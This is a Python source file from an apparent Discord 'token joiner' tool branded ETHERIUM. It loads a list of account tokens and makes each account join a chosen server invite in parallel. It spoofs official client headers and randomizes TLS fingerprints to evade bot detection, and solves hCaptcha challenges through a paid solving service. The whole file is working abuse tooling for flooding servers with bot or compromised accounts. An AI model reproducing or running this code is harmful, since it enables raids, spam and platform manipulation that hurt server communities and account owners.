
from core import *
from core.utils import *

s = Fore.LIGHTBLACK_EX
g = Fore.GREEN
w = Fore.WHITE 
b = Fore.BLUE
r = Fore.RED
y = Fore.YELLOW

import                  aiohttp
import                  base64
import                  colorama
import                  concurrent.futures
import                  ctypes
import                  discord
import                  easygui
import                  hashlib
import                  httpx
import                  json
import                  os
import                  platform
import                  random
import                  re
import                  requests
import                  shutil
import                  string
import                  subprocess
import                  sys
import                  time
import                  typing
import                  urllib
import                  websocket
import                  yaml
import                  tls_client
import                  time

from                    ab5                    import vgratient
from                    colorama               import Fore, Style
from                    concurrent.futures     import ThreadPoolExecutor, as_completed
from                    dataclasses            import dataclass
from                    datetime               import datetime
from                    discum                 import *
from                    itertools              import cycle
from                    json                   import dumps, loads
from                    pystyle                import *
from                    tls_client             import Session
from                    twocaptcha             import TwoCaptcha
from                    time                   import sleep

def get_two_captcha_api_key():
    with open('config.yaml', 'r') as file:
        config = yaml.safe_load(file)
    return config['SOLVER']['solver']

twocaptchakey = get_two_captcha_api_key()
solver = TwoCaptcha(twocaptchakey)

headers = {
    'authority': 'discord.com',
    'accept': '*/*',
    'accept-language': 'sv,sv-SE;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://discord.com',
    'referer': 'https://discord.com/',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9016 Chrome/108.0.5359.215 Electron/22.3.12 Safari/537.36',
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': 'sv-SE',
    'x-discord-timezone': 'Europe/Stockholm',
    'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDE2Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDUiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InN2IiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIGRpc2NvcmQvMS4wLjkwMTYgQ2hyb21lLzEwOC4wLjUzNTkuMjE1IEVsZWN0cm9uLzIyLjMuMTIgU2FmYXJpLzUzNy4zNiIsImJyb3dzZXJfdmVyc2lvbiI6IjIyLjMuMTIiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoyMTg2MDQsIm5hdGl2ZV9idWlsZF9udW1iZXIiOjM1MjM2LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
}

@dataclass
class JoinerData:
    pass

@dataclass
class Instance(JoinerData):
    client: tls_client.sessions
    token: str
    invite: str
    headers: dict


class Joiner:

    def __init__(self, data: Instance) -> None:
        self.session = data.client
        self.session.headers = data.headers
        self.get_cookies()
        self.instance = data

    def rand_str(self, length: int) -> str:
        return "".join(random.sample(string.ascii_lowercase + string.digits, length))

    def get_cookies(self) -> None:
        site = self.session.get("https://discord.com")
        self.session.cookies = site.cookies

    def solve(self, websiteURL, websiteKey, rqdata) -> object:
        result = solver.hcaptcha(sitekey=websiteKey, url=websiteURL, data=rqdata, invisible=1)
        return result

    def joinCap(self, rq_token, code) -> None:
        self.session.headers.update({"Authorization": self.instance.token})
        self.session.headers.update({"X-Captcha-Key": code})
        self.session.headers.update({"X-Captcha-Rqtoken": rq_token})
        result = self.session.post(
            f"https://discord.com/api/v9/invites/{self.instance.invite}",
            json={
                "session_id": self.rand_str(32),
            },
        )
        if result.status_code == 200:
            print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_GREEN}BYPASSED{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {b}[{result.status_code}]{w}")
        else:
            print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_RED}FAILED{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {r}[{result.status_code}]{w}")

            print(f'{s}{result.json()}')

    def join(self) -> None:
        self.session.headers.update({"Authorization": self.instance.token})
        result = self.session.post(
            f"https://discord.com/api/v9/invites/{self.instance.invite}",
            json={
                "session_id": self.rand_str(32),
            },
        )
        if result.status_code == 200:
            print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_GREEN}JOINED{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {g}[{result.status_code}]{w}")
        else:
            json_result = result.json()
            print(f'{s}{json_result}')
            if "captcha_key" in json_result:
                print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_YELLOW}SOLVING CAPTCHA{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {y}[{result.status_code}]{w}")
                rq_token = json_result["captcha_rqtoken"]
                rqdata = json_result['captcha_rqdata']
                this_solution = self.solve(f"https://discord.com/", json_result["captcha_sitekey"], rqdata)
                code = this_solution["code"]
                self.joinCap(rq_token, code)
            else:
                print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_RED}FAILED{COLOR_L}] {COLORAMA_GRAY}> {self.instance.token[:37]} {r}[{result.status_code}]{w}")

class intilize:
    def start(i):
        Joiner(i).join()

def TknJoiner():

    with open('stats/input/tokens.txt', 'r') as file:
        tokens = [line.strip() for line in file]

    instances = []
    invite = input(f"{INPUT} discord.gg/")

    for i in range(len(tokens)):
        header = headers
        instances.append(Instance(
            client=tls_client.Session(
            client_identifier=f"chrome_{random.randint(110,115)}",
            random_tls_extension_order=True
        ),
            token=tokens[i],
            headers=header,
            invite=invite
        ))

    with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
        futures = [executor.submit(intilize.start, i) for i in instances]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"                                        {COLOR_L}[ETHERIUM] | [{COLORAMA_RED}FAILED{COLOR_L}] {COLORAMA_GRAY}> {e}")

                
